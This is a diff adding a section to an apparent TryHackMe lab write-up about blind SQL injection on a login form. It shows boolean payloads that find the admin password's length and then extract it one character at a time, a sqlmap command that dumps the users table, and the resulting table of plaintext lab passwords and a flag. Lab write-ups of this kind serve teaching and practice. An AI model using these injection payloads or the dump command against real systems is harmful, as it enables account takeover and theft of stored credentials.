@@ -232,6 +232,50 @@ Logged in as rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9
 <details>
    <summary>Vulnerable Startup: Broken Authentication 3 (Blind Injection)</summary>
 
+### ``first try to know password length``
+
+```
+admin' AND length((SELECT password from users WHERE username='admin'))=1-- -
+```
+> change ``1`` untill login when login then this is password length you can user ``burp``
+>
+> found it in ``37``
+
+
+### ``now try go guess every char in the password ``
+
+```
+admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1) = CAST(X'54' as TEXT)-- -
+admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1) = a-- -
+```
+> first ``1`` mean first char in ``password``
+>
+> second ``1`` mean we use in every time one char
+>
+> when found first char true change first ``1`` to ``2`` and so on .....
+
+#### ``OR`` YOU can use ``SQLmap``
+
+```
+sqlmap -u http://10.10.247.180:5000/challenge3/login \--data="username=admin&password=admin" \--level=5 --risk=3 --dbms=sqlite --technique=B --dump
+```
+> found this
+
+```
+Table: users
+[5 entries]
++----+---------------------------------------+----------+
+| id | password                              | username |
++----+---------------------------------------+----------+
+| 1  | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb} | admin    |
+| 3  | asd                                   | amanda   |
+| 2  | Summer2019!                           | dev      |
+| 5  | 345m3io4hj3                           | emil     |
+| 4  | viking123                             | maja     |
++----+---------------------------------------+----------+
+
+```
+
 
    
 </details>
